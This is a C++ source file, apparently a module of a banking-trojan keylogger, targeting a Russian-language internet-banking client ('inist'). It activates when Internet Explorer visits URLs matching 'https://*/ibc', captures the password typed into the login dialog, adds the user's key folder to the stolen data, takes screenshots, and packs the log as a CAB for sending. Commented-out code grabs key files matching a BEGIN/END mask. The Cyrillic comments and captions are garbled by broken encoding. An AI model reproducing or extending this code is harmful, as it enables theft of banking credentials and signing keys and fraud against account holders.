#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "KeyLogSystems.h"
#include "FileGrabber.h"
#include "Utils.h"
#include "WndUtils.h"
#include "Unhook.h"
#include "BotClasses.h"

#include "BotDebug.h"

namespace DBGINISTWEB
{
	#include "DbgTemplates.h"
}

#define DBGINIST DBGINISTWEB::DBGOutMessage<>

#define InistWebModule //������� ��� ������ �������

namespace InistWeb
{
	char InistSystemName[] = "inist";

	PCHAR InistCaptions[] = {
		"*���������� ������������*",
		"������� ������",
		"������� � ����������",
		NULL};



 /*	PList hashKeys = 0; //������ ������ ������� ��� ���������
	CRITICAL_SECTION csHashKeys;

	//true - ���� ���� �������� ������ ������, � ����� �������� ��� � �������
	int IsFileKey( FileGrabber::ParamEvent* e )
	{
		if( e->data )
		{
			char c = ((char*)e->data)[0];
			if( c >= '0' && c <= '9' )
			{
				//������� ��������� �� ��� ��������� ����
				DWORD hashFile =  STR::GetHash( e->fileName, 0, false );
				bool exists = true;
				pEnterCriticalSection(&csHashKeys);
				if( List::IndexOf( hashKeys, (LPVOID)hashFile ) < 0 )
				{
					List::Add( hashKeys, (LPVOID)hashFile );
					exists = false;
				}
				pLeaveCriticalSection(&csHashKeys);
				if( !exists )
				{
					m_lstrcpy( e->nameSend, "keys" );
					return FileGrabber::SENDFOLDER;
				}
			}
		}
		return 0;
	}
	*/

//	void Activeted(LPVOID Sender)
//	{
//		DBGINIST( "Inist", "Activeted" );
//
//		hashKeys = List::Create();
//		pInitializeCriticalSection(&csHashKeys);
//
//		FileGrabber::Init(FileGrabber::CREATEFILEA);
//		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
//		rv->FuncReceiver = IsFileKey;
//		rv->minSize = 100;
//		rv->maxSize = 3000;
//		rv->maska = "*BEGIN*END*";
//		FileGrabber::AddReceiver(rv);
//	}

//	void Deactiveted(LPVOID Sender)
//	{
//		DBGINIST( "Inist", "Deactiveted" );
//		FileGrabber::Release();
//	}


	void WINAPI InistURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data)
	{
		// �������� �������� ����� ��������
		char Mask[] = "https://*/ibc";
		PCHAR URL = (PCHAR)Data;

		bool IsInist = CompareUrl(Mask, URL);
		if (IsInist)
		{
        	// ���������� �������
			PKeyLogSystem S = KeyLogger::SystemByName(InistSystemName);
			if (S != NULL)
                KeyLogger::ActivateSystem(S);
        }

    }
	//------------------------------------------------------------------------

	bool MakeLog(HWND ParentWnd)
	{
		// ��������� ���
		if (ParentWnd == NULL)
			return false;


		// ���������� �������� ����� ����������

		HWND PathWnd = (HWND)pFindWindowExA(ParentWnd, 0, "Combobox", 0 );;


		// ��� ������ ��������� ��� ������ ����
		if (PathWnd != NULL)
			PathWnd = (HWND)pFindWindowExA(ParentWnd, PathWnd, "Combobox", 0 );
		else
			PathWnd = (HWND)pFindWindowExA(ParentWnd, 0, "Edit", 0 );

		//��� ���� ����� ������
		HWND PassWnd = (HWND)pFindWindowExA(ParentWnd, PathWnd, "Edit", 0 );


		if (PathWnd == NULL || PassWnd == NULL)
			return false;

		// ��������� ����������
		PCHAR Path = GetWndText(PathWnd);

		trimall(Path, 0xA0);
		StrConcat(Path, "\\");

		// ��������� ������������ �����
		bool Valid = (DWORD)pGetFileAttributesA(Path) != INVALID_FILE_ATTRIBUTES;
		if (Valid)
		{
        	// ������������ ����������� ����� ������
			DWORD FolderSize = 0;
			Valid = SizeFolderLess(Path, 1024*1024*5, &FolderSize);
        }

		if (Valid)
		{
			KeyLogger::AddDirectory(Path, "Keys");
		}

		STR::Free(Path);

		PKeyLogger L = KeyLogger::GetKeyLogger();
		if (L != NULL)
		{
			PCHAR S = KLGPacker::GetTextDataFromFile(L->FileName, PassWnd);

			PCHAR LB = "\r\n";
			PCHAR Pass = "Password: ";

			PCHAR Buf = STR::New(5, LB, LB, Pass, S, LB);

			KeyLogger::AddStrToBuffer((HWND)L, Buf, 0);

			STR::Free(S);
			STR::Free(Buf);
		}

		KeyLogger::StopLogging();
		return true;
	}

  	//------------------------------------------------------------------------

	// ������ ��������� ���������
	void OnMessage(LPVOID Sender, PMSG Msg, bool IsUnicode)
	{
		if (Msg->message == WM_LBUTTONUP)
		{
			// ����������� ������� ������������ �� ������ Ok
			DWORD ID = (DWORD)pGetWindowLongPtrA(Msg->hwnd, GWL_ID);
			if (ID == 1)
			{
				// ������ ������ "Ok"

				HWND Parent = (HWND)pGetParent(Msg->hwnd);
				if (!KeyLogger::IsWindowDialog(Parent)) return;

				// � ������ ������ �������� ��� �������� - ������ ������ Ok
				// �� ������� �������, ���� ������ ������ ���� �� �������
				// ����� ����������� ����������
				// �� ����� ��������� ����� ������ ��� ����������� ���������
				// ���� ��� ������ ����������� ����������, �� ����������
				// �������� ������

				PKeyLogSystem S = KeyLogger::SystemByName(InistSystemName);
				if (S == NULL) return;

				PKlgWndFilter F = (PKlgWndFilter)List::GetItem(S->Filters, 0);
				if (F->DialogWnd != Parent)
				{
					// ��� ������� �� ����������� ����������
					// ����, �������� ������
					for (DWORD i = 0; InistCaptions[i] != NULL; i++ )
					{
						Parent = (HWND)pFindWindowA(NULL, InistCaptions[i]);
						if (Parent != NULL )
							break;
					}
					if (Parent == NULL) return;

                   	F->Activated = true;
                }

				MakeLog(Parent);
			}
        }

	}

	//------------------------------------------------------------------------
	void Init()
	{

		PKeyLogSystem S = KeyLogger::AddSystem(InistSystemName, PROCESS_HASH_IE);
		if( S != NULL )
		{
			S->SendLogAsCAB = true;
			//S->TimeMode    = KLG_TIME_MIN;
			//S->TimeValue   = 5*60; // ������� ����� �������� �� ����� 5-�� �����
			S->MakeScreenShot = true;
			S->OnMessage = OnMessage;
//			S->OnActivate = Activeted;
//			S->OnDeactivate = Deactiveted;

			//������ ������ P � Caption ����� ���� ��������� ��� �������
			char KeyboardCaption[] = {'*','�','�','�','�','�','�','�','�','�','*','�','�','�','�','�','�','�','�','�','*', 0};
            char ClassName[] = "#*";

			PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, NULL, InistCaptions[0], FILTRATE_PARENT_WND, LOG_ALL, 3);

			if (F1 != NULL)
			{
				F1->DontSaveMouseLog = true;

				KeyLogger::AddFilterText(F1, NULL, InistCaptions[1]);
				KeyLogger::AddFilterText(F1, NULL, InistCaptions[2]);

                // ��������� ������ ����������� ����������
				PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, false, ClassName, KeyboardCaption, FILTRATE_PARENT_WND, LOG_MOUSE, 3);
				if (F2 != NULL)
				{
                    F2->MouseLogWnd = MOUSE_LOG_WND_FILTER;
					F2->PreFilter = F1;
                }
            }
		}

		//������������� ������� �� ����� ���� � ��
		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, InistURLChanged);

	}
}
